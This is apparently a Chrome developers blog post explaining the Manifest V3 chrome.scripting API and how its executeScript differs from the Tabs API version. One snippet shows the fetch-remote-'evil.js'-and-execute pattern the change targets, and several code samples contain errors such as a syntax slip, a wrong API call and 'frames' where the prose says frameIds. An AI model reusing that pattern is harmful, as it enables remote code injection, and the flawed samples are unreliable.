---
title: "Introducing chrome.scripting"
# description: >
#   Why and how we implemented color vision deficiency simulation in DevTools and the Blink Renderer.
layout: "layouts/blog-post.njk"
authors:
  - dotproto
date: 2021-06-07
hero: 'image/WlD8wC6g8khYWPJUsQceQkhXSlv1/7SI8nw8jvSCspg2q71ya.png'
alt: ''
tags:
  - extensions
---

Manifest V3 introduces a number of changes to Chrome's extension platform. In this post, we'll be
exploring the motivations and changes introduced by one of the more notable changes: the
introduction of the [`chrome.scripting`][scripting-api] API.

## What is chrome.scripting?

As the name might suggest, `chrome.scripting` is a new namespace introduced in Manifest V3
responsible for script and style injection capabilities.

Developers that have created Chrome extensions in the past may be familiar with Manifest V2 methods
on the [Tabs API][tabs-api] like [`chrome.tabs.executeScript`][tabs-executescript] and
[`chrome.tabs.insertCSS`][tabs-insertcss]. These methods allow extensions to inject scripts and
stylesheets into pages, respectively. In Manifest V3, these capabilities have moved to
`chrome.scripting` and we plan to expand this API with some new capabilities in the future.

## Why create a new API?

With a change like this, one of the first questions that tends to come up is, "why?"

A few different factors lead to the Chrome team deciding to introduce a new namespace for scripting.
First, the Tabs API is a bit of a junk drawer for features. Second, we needed to make breaking
changes to the existing `executeScript` API. Third, we knew that we wanted to expand scripting
capabilities for extensions. Together, these concerns clearly defined a need for a new namespace to
house scripting capabilities.

### The junk drawer

One of the issues that has been bothering the Extensions Team for the past few years is that the
`chrome.tabs` API is overloaded. When this API was first introduced most of the capabilities it
provided were related to the broad concept of a browser tab. Even at that point, though, it was a
bit of a grab bag of features and over the years this collection has only grown.

By the time Manifest V3 was released, the Tabs API had grown to cover basic tab management,
selection management, window organization, messaging, zoom control, basic navigation, scripting, and
a few other smaller capabilities. While these are all important, it can be a bit overwhelming for
developers when they're getting started and for the Chrome team as we maintain the platform and
consider requests from the developer community.

Another complicating factor is that the `tabs` permission is not well understood. While many other
permissions restrict access to a given API (e.g. [`storage`][storage-api]), this permission is a bit
unusual in that it only grants the extension access to sensitive properties on Tab instances (and by
extension also impacts the Windows API). Understandably, many extension developers mistakenly think
they need this permission in order to access methods on the Tabs API like `chrome.tabs.create` or,
more germanely, `chrome.tabs.executeScript`. Moving functionality out of the Tabs API helps clear up
some of this confusion.

### Breaking changes

When designing Manifest V3, one of the major issues that we wanted to address was abuse and malware
enabled by "remotely-hosted code." It's common for abusive extension authors to execute scripts
fetched from remote servers to steal user data, inject malware, and evade detection. While good
actors also use this capability, we ultimately felt that it was simply too dangerous to remain as it
was.

There are a couple different ways that extensions can execute unbundled code, but the relevant one
here is the Manifest V2 `chrome.tabs.executeScript` method. This method allows an extension to
execute an arbitrary string of code in a target tab. This, in turn, means that a malicious developer
can fetch an arbitrary script from a remote server and execute it inside any page the extension can
access. We knew that if we wanted to address the remote code problem that we would have to drop this
feature.

```js
let result = await fetch('https://example.com/evil.js');
let script = await result.text();
chrome.tabs.executeScript({
  code: script,
});
```

We also wanted to clean up some other, more subtle issues with the Manifest V2 version's design,
and make the API a more polished and predictable tool.

While we could have changed the signature of this method within the Tabs API, we felt that between
these breaking changes and the introduction of new capabilities (covered in the next section), a
clean break would be easier for everyone.

### Expanding scripting capabilities

Another consideration that fed into the Manifest V3 design process was a desire to introduce
additional scripting capabilities to Chrome's extension platform. Specifically, we wanted to add
support for declarative content scripts and to expand the capabilities of the `executeScript`
method.

Declarative content scripts support has been a long-standing feature request in Chromium. Today,
Manifest V2 and V3 Chrome extensions can only statically declare content scripts in their
manifest.json file; the platform doesn't provide a way to register new content scripts, tweak
content script registration, or unregister content scripts at runtime.

While we knew that we wanted to tackle this feature request in Manifest V3, none of our existing
APIs felt like the right home. We also considered aligning with Firefox on their [Content Scripts
API][content-scripts], but very early on we identified a couple major drawbacks to this approach.
First, we knew that we would have incompatible signatures (e.g. dropping support for the `code`
property). Second, our API had a different set of design constraints (e.g. needing a registration to
persist beyond a service worker's lifetime). Finally, this namespace would also pigeonhole us to
content script functionality where we're thinking about scripting in extensions more broadly.

On the `executeScript` front, we also wanted to expand what this API could do beyond what the Tabs
API version supported. More specifically, we wanted to support functions and arguments, more easily
target specific frames, and target non-"tab" contexts.

Moving forward, we're also considering how extensions can interact with installed PWAs and other
contexts that don't conceptually map to "tabs."

## Changes between tabs.executeScript and scripting.executeScript

In the remainder of this post, I'd like to take a closer look at the similarities and differences
between [`chrome.tabs.executeScript`][tabs-executescript] and
[`chrome.scripting.executeScript`][scripting-executescript].

### Injecting a function with arguments

While considering how the platform would need to evolve in light of remotely-hosted code
restrictions, we wanted to find a balance between the raw power of arbitrary code execution and only
allowing static content scripts. The solution we struck on was to allow extensions to inject a
function as a content script and to pass an array of values as arguments.

Let's take a quick look at an (oversimplified) example. Say we wanted to inject a script that
greeted the user by name when the user clicks the extension's action button (icon in the toolbar).
In Manifest V2, we could dynamically construct a code string and execute that script in the current
page.

```js
// Manifest V2 extension
let userReq = await fetch('https://example.com/greetUser.js');
let userBody = await userReq.text();
let user = eval(userBody);

chrome.browserAction.onClicked.addListener((tab) => {
  chrome.tabs.executeScript({
    // user.greetUser == 'alert("Hello, <GIVEN_NAME>!")'
    code: user.greetUser,
  });
});
```

While Manifest V3 extensions can't use code that isn't bundled with the extension, our goal was to
preserve some of the dynamism that arbitrary code blocks enabled for Manifest V2 extensions. The
function and arguments approach makes it possible for Chrome Web Store reviewers, users, and other
interested parties to more accurately assess the risks an extension poses while also allowing
developers to modify an extension's runtime behavior based on user settings or application state.

```js
// Manifest V3 extension
let userReq = await fetch('https://example.com/user-data.json');
let user = await userReq.json();
let givenName = user.givenName || '<GIVEN_NAME>';

function greetUser(name) {
  alert(`Hello, ${name}!`);
}
chrome.action.onClicked.addListener((tab) => {
  chrome.tabs.executeScript(tab.id, {
    func: greetUser,
    args: [givenName],
  });
});
```

### Targeting frames

We also wanted to improve how developers interact with frames in the revised API. The Manifest V2
version of `executeScript` allowed developers to target either all frames in a tab or a specific
frame in the tab.

```js
// Manifest V2 extension
chrome.browserAction.onClicked.addListener((tab) => {
  chrome.tabs.executeScript(tab.id, {
    frameId: targetFrame1,
    file: 'content-script.js',
  });
  chrome.tabs.executeScript(tab.id, {
    frameId: targetFrame2,
    file: 'content-script.js',
  });
});
```

In Manifest V3, we replaced the optional `frameId` integer property in the options object with an
optional `frameIds` array of integers; this allows developers to target multiple frames in a single
API call. You can use use `chrome.webNavigation.getAllFrames` to get a list of all frames in a tab.

```js
// Manifest V3 extension
chrome.action.onClicked.addListener((tab) => {
  chrome.scripting.executeScript({
    target: {
      tabId: tab.id,
      frames: [targetFrame1, targetFrame2],
    },
    files: ['content-script.js'],
  });
});
```

### Script injection results

We've also improved the way we return script injection results in Manifest V3. A "result" is
basically the final statement evaluated in a script. Think of it like the value returned when you
execute a block of code in the Chrome DevTools console.

In Manifest V2, `executeScript` and `insertCSS` would return an array of bare execution results.
This is fine for a single injection point, but if you're injecting into all frames in a tab it can
be difficult to track down which frame encountered the error.

For a concrete example, let's take a look at the results returned by a Manifest V2 and Manifest V3.
Both versions of the extension will share the same content script behavior. And for both examples,
we'll be injecting on the same [demo page][iframe-demo].

```js
//// content-script.js
var url = new URL(window.location.href);
if (url.pathname.endsWith('.html')) {
  throw new Error('Incompatible URL path!');
}
'success';
```

When we run the Manifest V2 version, we get back an array of `['success', null]`. Which result
corresponds to the main frame and which is for the iframe? The return value doesn't tell us, so we
don't know for sure.

```js
// Manifest V2 extension
chrome.browserAction.onClicked.addListener((tab) => {
  chrome.tabs.executeScript({
    allFrames: true,
    file: 'content-script.js';,
  }, (results) => {
    // results == ['success', null]
    for (let result of results) {
      if (result !== 'success') {
        console.log('An error occurred, but where?');
      }
    }
  });
});
```

In the Manifest V3 version, results now contains an array of objects instead of an array of strings,
and the result objects clearly identify the ID of the frame for each result. This makes it much
easier for developers to identify and react to situations where injection fails unexpectedly.

```js
// Manifest V3 extension
chrome.action.onClicked.addListener(async (tab) => {
  let results = await chrome.scripting.executeScript({
    target: {tabId: tab.id, allFrames: true},
    files: ['content-script.js'],
  });
  // results == [{frameId: 0, result: 'success'}, {frameId: 1234, result: null}]
  for (let output of results) {
    if (output.result !== 'success') {
      console.log(`An error occurred in frame ${output.frameId}`);
    }
  }
});
```

## Wrap up

Manifest version bumps present a rare opportunity to rethink and modernize extensions APIs. Our
goal with Manifest V3 is to improve the end user experience by making extensions safer while also
improving the developer experience. By introducing `chrome.scripting` in Manifest V3, we were able
to help clean up the Tabs API, to reimagine `executeScript` for a more secure extensions platform,
and to lay the groundwork for new scripting capabilities that will be coming later this year.

If you have any thoughts or feedback on what we've shared here or Manifest V3 in general, head over
to the [chromium-extensions](crx-group) Google Group and tell us what you think.

[content-scripts]: https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts
[crx-group]: https://groups.google.com/a/chromium.org/g/chromium-extensions
[iframe-demo]: https://simple-iframe-demo.glitch.me/
[storage-api]: #link-to-storage-api-docs
[tabs-api]: /docs/extensions/reference/tabs/
[tabs-executescript]: /docs/extensions/reference/tabs/#method-executeScript
[tabs-insertcss]: /docs/extensions/reference/tabs/#method-insertCSS
[scripting-api]: /docs/extensions/reference/scripting/
[scripting-executescript]: /docs/extensions/reference/scripting/#method-executeScript
